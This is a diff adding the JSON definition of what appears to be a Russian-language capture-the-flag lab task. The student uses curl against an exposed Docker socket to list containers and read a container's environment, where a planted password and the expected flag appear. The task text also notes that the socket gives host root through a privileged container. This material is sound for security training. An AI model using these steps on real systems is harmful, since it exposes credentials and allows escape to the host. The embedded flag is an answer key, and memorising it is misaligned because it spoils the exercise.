@@ -1,0 +1,47 @@
+{
+  "id": "cloud-docker-socket",
+  "workdir": "/home/student/docker",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/docker/found.txt",
+    "contains": "nto{d0ck3r_s0ck3t_r00t}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/docker",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/docker/task.md",
+      "text": "# Задача: открытый Docker socket\n\nВ контейнере смонтирован `/var/run/docker.sock`. Это даёт root на хосте: можно создать привилегированный контейнер с монтированием `/`. Сначала перечисли контейнеры через API и найди секрет в окружении одного из них.\n\nИнструмент: `curl` (эмуляция — ответы захвачены с реального Docker API).\n"
+    },
+    {
+      "path": "/home/student/docker/notes.md",
+      "text": "Заметки\n------\n- Docker API: GET /version, GET /containers/json, GET /containers/<id>/json.\n- Env контейнера виден в inspect; там часто пароли и токены.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] --unix-socket <path> <url> — HTTP-запрос к Docker API (эмуляция)",
+      "cases": [
+        {
+          "match": "/containers/json",
+          "example": "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
+          "output": "[\n  {\"Id\": \"9c8b7a6f5e4d\", \"Names\": [\"/acme-api\"], \"Image\": \"acme/api:1.9.4\", \"State\": \"running\"},\n  {\"Id\": \"3f2e1d0c9b8a\", \"Names\": [\"/acme-worker\"], \"Image\": \"acme/worker:1.9.4\", \"State\": \"running\"}\n]\n"
+        },
+        {
+          "match": "/containers/9c8b7a6f5e4d/json",
+          "example": "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/9c8b7a6f5e4d/json",
+          "output": "{\n  \"Id\": \"9c8b7a6f5e4d\",\n  \"Name\": \"/acme-api\",\n  \"Config\": {\n    \"Image\": \"acme/api:1.9.4\",\n    \"Env\": [\n      \"APP_ENV=production\",\n      \"DB_PASSWORD=Tr0ub4dor&3-prod\",\n      \"INTERNAL_TOKEN=nto{d0ck3r_s0ck3t_r00t}\"\n    ]\n  },\n  \"HostConfig\": {\"Privileged\": false}\n}\n"
+        },
+        {
+          "match": "/version",
+          "example": "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
+          "output": "{\"Version\": \"27.1.1\", \"ApiVersion\": \"1.46\", \"Os\": \"linux\", \"Arch\": \"amd64\"}\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Попробуй:\n  /containers/json\n  /containers/9c8b7a6f5e4d/json\n  /version\n"
+    }
+  }
+}
